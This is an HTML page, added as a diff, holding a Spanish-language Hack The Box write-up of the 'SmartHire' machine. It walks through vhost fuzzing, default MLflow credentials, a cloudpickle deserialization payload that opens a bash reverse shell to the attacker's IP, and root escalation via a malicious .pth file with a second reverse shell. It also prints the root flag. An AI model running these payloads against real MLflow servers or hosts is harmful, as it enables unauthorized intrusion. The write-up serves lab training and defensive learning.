@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>SmartHire · Hack The Box Writeup</title>
+    <!-- Estilos CSS modernos y profesionales -->
+    <style>
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0b0e14;
+            color: #e4e9f0;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+            line-height: 1.7;
+            padding: 2rem 1.5rem;
+        }
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: #141a24;
+            border-radius: 2rem;
+            padding: 2.5rem 2rem;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
+            border: 1px solid #2a3346;
+        }
+        /* Header */
+        .header-image {
+            width: 100%;
+            border-radius: 1.5rem;
+            margin-bottom: 2rem;
+            border: 1px solid #2a3346;
+            box-shadow: 0 12px 24px -8px rgba(0,0,0,0.6);
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            background: linear-gradient(135deg, #60a5fa, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.25rem;
+        }
+        .subtitle {
+            color: #9aa4b8;
+            font-size: 1.1rem;
+            margin-bottom: 2rem;
+            border-left: 4px solid #3b82f6;
+            padding-left: 1.2rem;
+        }
+        .badge {
+            display: inline-block;
+            background: #1e293b;
+            color: #b9c7e0;
+            border-radius: 999px;
+            padding: 0.2rem 1rem;
+            font-size: 0.8rem;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+            margin-right: 0.5rem;
+            border: 1px solid #2d3a4f;
+        }
+        .badge-success {
+            background: #0b4b3a;
+            color: #6ee7b7;
+            border-color: #0f6e54;
+        }
+        .badge-root {
+            background: #4c1d2c;
+            color: #f9a8b7;
+            border-color: #7f2d3f;
+        }
+        .section {
+            margin-top: 2.8rem;
+        }
+        .section h2 {
+            font-size: 2rem;
+            font-weight: 600;
+            margin-bottom: 1.2rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid #2a3346;
+            color: #d6e0f0;
+        }
+        .section h3 {
+            font-size: 1.4rem;
+            font-weight: 500;
+            margin: 1.5rem 0 0.8rem 0;
+            color: #bfccf0;
+        }
+        .section p {
+            color: #c8d0e0;
+            margin-bottom: 0.8rem;
+        }
+        .code-block {
+            background: #0e141f;
+            border-radius: 1rem;
+            padding: 1.2rem 1.5rem;
+            margin: 1rem 0;
+            border: 1px solid #253040;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.9rem;
+            color: #d4dcec;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.4);
+        }
+        .code-block .cmd {
+            color: #b0c7f0;
+        }
+        .code-block .output {
+            color: #8bcb9e;
+        }
+        .code-block .comment {
+            color: #6b7b96;
+            font-style: italic;
+        }
+        .highlight-box {
+            background: #1e293b;
+            border-left: 4px solid #3b82f6;
+            padding: 1rem 1.5rem;
+            border-radius: 0.75rem;
+            margin: 1.2rem 0;
+        }
+        .highlight-box strong {
+            color: #93bbfc;
+        }
+        .grid-2 {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .grid-2 .item {
+            background: #111b26;
+            border-radius: 1rem;
+            padding: 1rem 1.5rem;
+            border: 1px solid #253040;
+        }
+        .grid-2 .item .label {
+            color: #8899b0;
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .grid-2 .item .value {
+            font-weight: 500;
+            font-size: 1.1rem;
+            margin-top: 0.2rem;
+        }
+        .flag {
+            background: #0f1f2b;
+            border-radius: 1rem;
+            padding: 0.5rem 1.2rem;
+            display: inline-block;
+            font-family: monospace;
+            color: #f0d06b;
+            border: 1px solid #3d4a5e;
+            letter-spacing: 0.5px;
+        }
+        /* Footer */
+        footer {
+            margin-top: 3.5rem;
+            padding-top: 2rem;
+            border-top: 1px solid #253040;
+            text-align: center;
+            color: #7c8aa3;
+        }
+        .footer-link {
+            display: inline-block;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #b0c7f0;
+            text-decoration: none;
+            padding: 0.3rem 0.8rem;
+            border-radius: 0.6rem;
+            transition: all 0.25s ease;
+            cursor: pointer;
+            background: transparent;
+        }
+        .footer-link:hover {
+            color: #ffffff;
+            background: #2563eb;
+            transform: scale(1.04);
+            box-shadow: 0 8px 24px -6px #2563eb80;
+        }
+        .footer-link:active {
+            transform: scale(0.96);
+        }
+        .footer-copy {
+            margin-top: 0.8rem;
+            font-size: 0.85rem;
+        }
+        .footer-copy a {
+            color: #6b8fc0;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .footer-copy a:hover {
+            color: #93bbfc;
+            text-decoration: underline;
+        }
+        /* Responsive */
+        @media (max-width: 700px) {
+            body { padding: 1rem 0.8rem; }
+            .container { padding: 1.5rem 1rem; border-radius: 1.2rem; }
+            h1 { font-size: 2rem; }
+            .grid-2 { grid-template-columns: 1fr; }
+        }
+        /* Scrollbar bonito */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #141a24; }
+        ::-webkit-scrollbar-thumb { background: #2d3a4f; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #3b4b66; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+
+    <!-- IMAGEN PRINCIPAL (cargada desde la raíz del repositorio) -->
+    <img src="smarthire.png" alt="SmartHire logo" class="header-image" />
+
+    <h1>SmartHire</h1>
+    <div class="subtitle">
+        Hack The Box · Linux · Medium · <span class="badge badge-success">RCE</span>
+        <span class="badge badge-root">PrivEsc → Root</span>
+    </div>
+
+    <!-- Resumen ejecutivo -->
+    <section class="section">
+        <h2>📌 Resumen Ejecutivo</h2>
+        <div class="highlight-box">
+            <p><strong>IP:</strong> 10.129.245.215 &nbsp;|&nbsp; <strong>Servicios:</strong> SSH (22), HTTP (80)</p>
+            <p><strong>Vector inicial:</strong> Fuzzing de subdominios → <code>models.smarthire.htb</code> (MLflow) con credenciales por defecto <code>admin:password</code>.</p>
+            <p><strong>Explotación:</strong> Inyección de artefacto <code>python_model.pkl</code> malicioso (cloudpickle) en MLflow, provocando RCE al llamar a <code>/predict</code>.</p>
+            <p><strong>Escalada:</strong> Abuso de <code>sudo</code> en script Python que procesa archivos <code>.pth</code> en directorio escribible por grupo <code>devs</code>, obteniendo shell <strong>root</strong>.</p>
+            <p><strong>Flags:</strong> <span class="flag">user.txt</span> (omitida) · <span class="flag">root.txt: e8bb6cb4af78805b2dbe178f5f9ccfc4</span></p>
+        </div>
+    </section>
+
+    <!-- 1. Reconocimiento -->
+    <section class="section">
+        <h2>🔍 1. Reconocimiento</h2>
+
+        <h3>Escaneo de puertos</h3>
+        <div class="code-block">
+            <span class="cmd">nmap -sS -sC -sV -T4 -Pn 10.129.245.215</span>
+        </div>
+        <div class="grid-2">
+            <div class="item"><span class="label">Puerto 22</span><div class="value">SSH · OpenSSH 8.9p1</div></div>
+            <div class="item"><span class="label">Puerto 80</span><div class="value">HTTP · nginx 1.18.0</div></div>
+        </div>
+
+        <h3>Descubrimiento de vhosts</h3>
+        <div class="code-block">
+            <span class="cmd">ffuf -u http://smarthire.htb -H "Host: FUZZ.smarthire.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 169</span>
+            <br /><span class="output">models &nbsp; [Status: 401, Size: 137] → WWW-Authenticate: Basic realm="mlflow"</span>
+        </div>
+        <p>Se añadió el subdominio al <code>/etc/hosts</code>:</p>
+        <div class="code-block">
+            <span class="cmd">echo "10.129.245.215 smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts</span>
+        </div>
+    </section>
+
+    <!-- 2. Acceso a MLflow y Payload -->
+    <section class="section">
+        <h2>⚙️ 2. Acceso a MLflow y Preparación del Payload</h2>
+
+        <h3>Credenciales por defecto</h3>
+        <div class="code-block">
+            <span class="cmd">curl -s -u admin:password http://models.smarthire.htb/</span>
+            <br /><span class="output">&lt;!doctype html&gt;... (HTML de MLflow)</span>
+        </div>
+
+        <h3>Creación de experimento y run</h3>
+        <div class="code-block">
+            <span class="cmd"># Crear experimento</span>
+            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/experiments/create" -H "Content-Type: application/json" -d '{"name": "SmartHire"}'</span>
+            <br /><span class="output">{"experiment_id": "299186230178410763"}</span>
+            <br /><br />
+            <span class="cmd"># Crear run</span>
+            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/runs/create" -H "Content-Type: application/json" -d '{"experiment_id": "299186230178410763", "start_time": 1700000000000, "tags": [{"key": "mlflow.runName", "value": "testcompany-run"}]}'</span>
+            <br /><span class="output">{"run": {"info": {"run_uuid": "35c41f3b28964ceab42b804d82d5cfee", ...}}}</span>
+        </div>
+
+        <h3>Generación del artefacto malicioso (cloudpickle)</h3>
+        <p>Script <code>gen_payload.py</code>:</p>
+        <div class="code-block">
+            <span class="comment"># gen_payload.py</span>
+            import cloudpickle, os<br />
+            <br />
+            class Payload:<br />
+            &nbsp;&nbsp;&nbsp;def __reduce__(self):<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'"<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (os.system, (cmd,))<br />
+            <br />
+            with open('/tmp/python_model.pkl', 'wb') as f:<br />
+            &nbsp;&nbsp;&nbsp;cloudpickle.dump(Payload(), f)
+        </div>
+        <div class="code-block">
+            <span class="cmd">python3 gen_payload.py</span>
+        </div>
+
+        <h3>Subida de artefactos y registro del modelo</h3>
+        <p>Se creó el archivo <code>MLmodel</code> (YAML) con:</p>
+        <div class="code-block">
+            time_created: '2026-07-02 01:00:00.000000'<br />
+            flavors:<br />
+            &nbsp;&nbsp;python_function:<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;model_path: python_model.pkl<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;loader_module: mlflow.sklearn<br />
+            &nbsp;&nbsp;&nbsp;&nbsp;python_version: 3.10.12
+        </div>
+        <p>Subida y creación de versiones:</p>
+        <div class="code-block">
+            <span class="cmd"># Subir MLmodel y python_model.pkl</span>
+            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/MLmodel" -H "Content-Type: text/plain" --data-binary @/tmp/MLmodel</span>
+            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/upload-artifact?run_uuid=35c41f3b28964ceab42b804d82d5cfee&path=model/python_model.pkl" -H "Content-Type: application/octet-stream" --data-binary @/tmp/python_model.pkl</span>
+            <br /><br />
+            <span class="cmd"># Crear el modelo con el nombre exacto (obtenido de /model_info)</span>
+            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/registered-models/create" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model"}'</span>
+            <br /><br />
+            <span class="cmd"># Crear versiones 1, 2, 3 (la versión 3 contiene el payload final)</span>
+            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/create" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model", "source": "mlflow-artifacts:/299186230178410763/35c41f3b28964ceab42b804d82d5cfee/artifacts/model", "run_id": "35c41f3b28964ceab42b804d82d5cfee"}'</span>
+            <br /><span class="output">{"model_version": {"version": "3", ...}}</span>
+            <br /><br />
+            <span class="cmd"># Promover versión 3 a Production</span>
+            <span class="cmd">curl -X POST -u admin:password "http://models.smarthire.htb/ajax-api/2.0/mlflow/model-versions/transition-stage" -H "Content-Type: application/json" -d '{"name": "testcompany-209c9516c5b6-model", "version": "3", "stage": "Production"}'</span>
+        </div>
+    </section>
+
+    <!-- 3. Explotación -->
+    <section class="section">
+        <h2>💥 3. Explotación – RCE vía /predict</h2>
+
+        <h3>Obtención de sesión en SmartHire</h3>
+        <div class="code-block">
+            <span class="cmd"># Registro de usuario</span>
+            <span class="cmd">curl -c cookies.txt -X POST http://smarthire.htb/register -d "username=test&password=test&company=testcompany"</span>
+            <br /><span class="output">Redirecting to /login ...</span>
+            <br /><br />
+            <span class="cmd"># Login</span>
+            <span class="cmd">curl -b cookies.txt -c cookies.txt -X POST http://smarthire.htb/login -d "username=test&password=test"</span>
+            <br /><span class="output">Redirecting to /dashboard ...</span>
+        </div>
+
+        <h3>CSV válido para /predict</h3>
+        <div class="code-block">
+            <span class="cmd">cat > /tmp/resume.csv <<EOF</span>
+            experience,skills<br />
+            5,Python<br />
+            3,JavaScript<br />
+            EOF
+        </div>
+
+        <h3>Disparo del payload</h3>
+        <div class="code-block">
+            <span class="cmd">curl -b cookies.txt -X POST http://smarthire.htb/predict -F "file=@/tmp/resume.csv"</span>
+            <br /><span class="output">{"message":"'int' object has no attribute 'predict'","status":"error"}</span>
+            <br /><span class="comment"># El error confirma la ejecución del payload</span>
+        </div>
+
+        <h3>Recepción de shell como svcweb</h3>
+        <div class="code-block">
+            <span class="cmd">nc -lvnp 4444</span>
+            <br /><span class="output">connect to [10.10.14.11] from [10.129.245.215] 49158</span>
+            <br /><span class="output">svcweb@smarthire:/var/www/smarthire.htb$</span>
+        </div>
+    </section>
+
+    <!-- 4. Escalada -->
+    <section class="section">
+        <h2>⬆️ 4. Escalada de Privilegios a Root</h2>
+
+        <h3>Verificación de permisos sudo y grupo</h3>
+        <div class="code-block">
+            <span class="cmd">sudo -l</span>
+            <br /><span class="output">(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *</span>
+            <br /><br />
+            <span class="cmd">id</span>
+            <br /><span class="output">uid=1000(svcweb) gid=1000(svcweb) groups=1000(svcweb),1001(mlflowweb),1002(devs)</span>
+        </div>
+
+        <h3>Análisis del directorio de plugins</h3>
+        <div class="code-block">
+            <span class="cmd">ls -la /opt/tools/mlflow_ctl/plugins/</span>
+            <br /><span class="output">drwxrwxr-x 2 root devs 4096 May 12 15:22 dev</span>
+            <br /><span class="comment"># El directorio dev es escribible por el grupo devs</span>
+        </div>
+
+        <h3>Creación del archivo .pth malicioso</h3>
+        <div class="code-block">
+            <span class="cmd">echo 'import os; os.system("bash -c \"bash -i >& /dev/tcp/10.10.14.11/4445 0>&1\"")' > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth</span>
+        </div>
+
+        <h3>Listener y ejecución del script con sudo</h3>
+        <div class="code-block">
+            <span class="comment"># En la máquina atacante (nuevo listener)</span>
+            <span class="cmd">nc -lvnp 4445</span>
+            <br /><br />
+            <span class="comment"># En la shell de svcweb</span>
+            <span class="cmd">sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status</span>
+            <br /><br />
+            <span class="output">connect to [10.10.14.11] from [10.129.245.215] 46180</span>
+            <br /><span class="output">root@smarthire:/var/www/smarthire.htb#</span>
+        </div>
+    </section>
+
+    <!-- 5. Flags -->
+    <section class="section">
+        <h2>🏁 5. Flags</h2>
+        <div class="grid-2">
+            <div class="item">
+                <span class="label">Flag de usuario</span>
+                <div class="value"><span class="flag">user.txt</span> (omitida por seguridad)</div>
+            </div>
+            <div class="item">
+                <span class="label">Flag de root</span>
+                <div class="value"><span class="flag">e8bb6cb4af78805b2dbe178f5f9ccfc4</span></div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 6. Lecciones aprendidas -->
+    <section class="section">
+        <h2>🧠 6. Lecciones Aprendidas</h2>
+        <ul style="color: #c8d0e0; margin-left: 1.5rem; padding-left: 0.5rem; list-style-type: square;">
+            <li><strong>Credenciales por defecto</strong> en servicios internos (MLflow) son un vector crítico.</li>
+            <li><strong>Deserialización insegura</strong> de <code>cloudpickle</code> permite ejecución remota de comandos.</li>
+            <li><strong>Permisos mal configurados</strong> (directorio escribible por grupo en un script con <code>sudo</code>) permiten escalada a root mediante archivos <code>.pth</code>, que son procesados automáticamente por <code>site.addsitedir()</code>.</li>
+            <li>La <strong>enumeración meticulosa</strong> de vhosts y rutas es esencial para descubrir superficies de ataque ocultas.</li>
+        </ul>
+    </section>
+
+    <!-- 7. Herramientas -->
+    <section class="section">
+        <h2>🛠️ 7. Herramientas Utilizadas</h2>
+        <div style="display: flex; flex-wrap: wrap; gap: 0.8rem; margin-top: 0.5rem;">
+            <span class="badge">Nmap</span>
+            <span class="badge">FFUF</span>
+            <span class="badge">cURL</span>
+            <span class="badge">cloudpickle</span>
+            <span class="badge">Netcat</span>
+            <span class="badge">Python</span>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <a href="https://linkre.ee/cosmenoide" target="_blank" class="footer-link" rel="noopener noreferrer">
+            🚀 Cosmenoide Dev
+        </a>
+        <div class="footer-copy">
+            &copy; 2026 · Writeup elaborado para fines educativos · 
+            <a href="https://github.com/cosmenoide" target="_blank">GitHub</a>
+        </div>
+    </footer>
+
+</div>
+</body>
+</html>
